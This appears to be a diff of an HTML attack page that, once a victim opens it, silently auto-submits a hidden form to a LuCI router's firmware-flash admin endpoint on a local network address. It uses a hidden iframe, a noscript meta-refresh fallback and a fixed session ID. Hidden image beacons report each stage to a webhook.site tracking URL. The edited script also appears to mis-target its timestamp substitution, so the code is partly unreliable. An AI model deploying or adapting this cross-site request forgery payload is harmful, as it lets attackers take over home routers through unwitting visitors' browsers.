@@ -1,24 +1,28 @@
-<!doctype html><meta charset="utf-8"><title>check</title>
-<script>
-  const t = new URL(location.href).searchParams.get('t') || Date.now();
+<!doctype html><meta charset="utf-8"><title>go</title>
 
-  new Image().src = 'https://webhook.site/57a5efaf-3957-4be7-b7a8-29d7c0bb4026?stage=visit&t=' + encodeURIComponent(t);
-</script>
 
-<!-- 내부로 보낼 숨은 프레임: 완료되면 posted 비콘 -->
+<img src="https://webhook.site/57a5efaf-3957-4be7-b7a8-29d7c0bb4026?stage=visit&ts={TS}" style="display:none" />
+
 <iframe name="u" style="display:none"
-        onload="new Image().src='https://webhook.site/57a5efaf-3957-4be7-b7a8-29d7c0bb4026?stage=posted&t='+(new URL(location.href).searchParams.get('t')||Date.now())"></iframe>
+  onload="new Image().src='https://webhook.site/57a5efaf-3957-4be7-b7a8-29d7c0bb4026?stage=posted&ts='+Date.now()"></iframe>
 
-<form id="f"
-      action="http://192.168.0.123/cgi-bin/luci/admin/system/flash"
-      method="POST" enctype="multipart/form-data" target="u">
+<form id="f" target="u"
+  action="http://192.168.0.123/cgi-bin/luci/admin/system/flash"
+  method="POST" enctype="multipart/form-data">
   <input type="hidden" name="sessionid" value="abc123def4567890">
   <input type="hidden" name="step" value="1">
 </form>
 
-<script>setTimeout(()=>document.getElementById('f').submit(),800);</script>
+<script>
+
+  document.currentScript.previousElementSibling.src =
+    document.currentScript.previousElementSibling.src.replace('{TS}', Date.now());
+
+  setTimeout(()=>document.getElementById('f').submit(), 800);
+</script>
+
 
 <noscript>
   <meta http-equiv="refresh"
-        content="1;url=http://192.168.0.123/cgi-bin/luci/admin/system/flash?sessionid=abc123def4567890&step=1">
+    content="1;url=http://192.168.0.123/cgi-bin/luci/admin/system/flash?sessionid=abc123def4567890&step=1">
 </noscript>
